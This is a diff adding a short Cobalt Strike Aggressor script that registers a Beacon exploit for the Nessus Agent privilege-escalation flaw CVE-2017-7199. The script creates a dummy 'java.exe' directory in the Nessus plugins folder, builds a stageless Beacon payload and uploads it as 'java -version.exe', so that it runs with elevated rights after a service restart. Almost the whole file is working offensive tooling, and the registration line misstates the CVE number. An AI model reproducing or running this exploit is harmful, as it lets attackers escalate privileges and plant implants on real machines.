@@ -1,0 +1,27 @@
+sub nessus {
+
+	$bid = $1;
+	$listener = $2;
+
+	btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " via CVE-2017-7199");
+
+	# Create the dummy java.exe directory
+	bmkdir!($bid, "C:\\ProgramData\\Tenable\\Nessus Agent\\nessus\\plugins\\java.exe");
+
+	if ( -is64 $bid ) { $arch = "x64" }
+	else { $arch = "x86" }
+
+	# Generate stageless artifact
+	artifact_stageless($listener, "exe", $arch, $null, $this);
+	yield;
+
+	$payload = $1;
+
+	# Upload binary
+	bupload_raw!($bid, "C:\\ProgramData\\Tenable\\Nessus Agent\\nessus\\plugins\\java -version.exe", $payload);
+
+	blog2($bid, "Wait for, or force a service/system restart, then link to your Beacon. Also requires manual cleanup.");
+	
+}
+
+beacon_exploit_register("nessus-agent", "Nessus Agent 6.6.2-6.10.3 (CVE-20174-7199)", &nessus);
